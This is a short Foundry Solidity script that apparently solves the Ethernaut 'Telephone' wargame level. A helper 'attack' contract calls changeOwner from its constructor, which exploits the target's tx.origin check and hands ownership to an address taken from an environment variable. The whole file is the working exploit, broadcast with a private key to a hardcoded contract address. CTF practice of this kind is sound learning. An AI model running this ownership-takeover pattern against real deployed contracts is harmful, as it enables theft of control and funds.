// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephon.sol";

contract attack {
    constructor(Telephone _code, address acc) {
        _code.changeOwner(acc);
    }
}

contract Telephon is Script {
    Telephone public code = Telephone(0xd07804bD6a69EbAe3E1bCE88F7d78bcC236c0417);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        new attack(code, vm.envAddress("ACC"));
        vm.stopBroadcast();
    }
}
